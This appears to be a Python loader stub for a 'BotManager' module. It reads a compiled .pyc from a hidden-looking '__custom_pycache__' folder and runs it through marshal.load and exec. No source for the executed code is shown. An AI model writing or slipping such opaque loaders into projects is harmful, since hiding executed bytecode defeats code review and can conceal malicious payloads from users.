
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BotManager_bcd9dea2392a4fc4af449e6234911097.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
